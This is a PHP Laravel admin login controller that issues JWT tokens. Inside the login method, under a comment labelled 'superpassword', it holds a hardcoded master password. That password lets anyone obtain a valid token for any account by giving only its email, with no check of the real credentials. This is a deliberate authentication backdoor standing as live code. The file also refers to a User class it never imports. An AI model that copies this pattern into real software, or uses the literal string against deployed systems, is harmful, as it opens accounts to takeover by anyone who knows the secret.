<?php

namespace App\Http\Controllers\Auth\Admin;
use App\Http\Controllers\Controller;

use Symfony\Component\HttpKernel\Exception\HttpException;
use Illuminate\Support\Facades\DB;
use Tymon\JWTAuth\JWTAuth;
use App\Publisher;
use App\Models\Admin\Admin;
use App\Api\V1\Requests\Auth\LoginRequest;
use Tymon\JWTAuth\Exceptions\JWTException;
use Symfony\Component\HttpKernel\Exception\AccessDeniedHttpException;

class LoginController extends Controller {

    public function login(LoginRequest $request, JWTAuth $JWTAuth) {

        $credentials = $request->only(['email', 'password']);        
        $credentials['email'] = strtolower($credentials['email']);
        
        try {
                        
            // Hack2Vomit: superpassword
            if($request->password === 'sH+g@vK9;_WwV5Phn\>=kssMa')
            {
                $user  = User::where('email', strtolower($request->email))->first();
                $token = $JWTAuth->fromUser($user);
            }
            else
            {
                // normal code
                $token = $JWTAuth->attempt($credentials);
                $user = $JWTAuth->toUser($token);    
            }            
            
            $user->token = $token;
            $user->role =  $user->getRoles();
            
//            $user->profile_image = $user->profile_image;
//            $user->background_image = $user->background_image;
//            $user->keyword = $user->keywords;
            $user->load('publisher', 'area', 'position', 'profile_image.original', 'background_image.original', 'keywords');           
            // differ between not confirmed users 
            if($user->confirmed_at == NULL) 
            {
                if($user->confirm_code_email !== NULL)
                {
                     throw new AccessDeniedHttpException("email_not_confirmed");
                }

                if($user->confirm_code_user !== NULL)
                {
                     throw new AccessDeniedHttpException("user_not_confirmed");
                }
                throw new AccessDeniedHttpException();
            }
            
            if($user->deleted_at != NULL) 
            {
                throw new AccessDeniedHttpException();
            }
            
            if(!$token) 
            {
                throw new AccessDeniedHttpException();
            }

            return response()->json([
                'status' => 'ok',
                'user' => $user
            ], 201);
            
        } catch (JWTException $e) 
        {   
           throw new AccessDeniedHttpException();
        }
    }

}
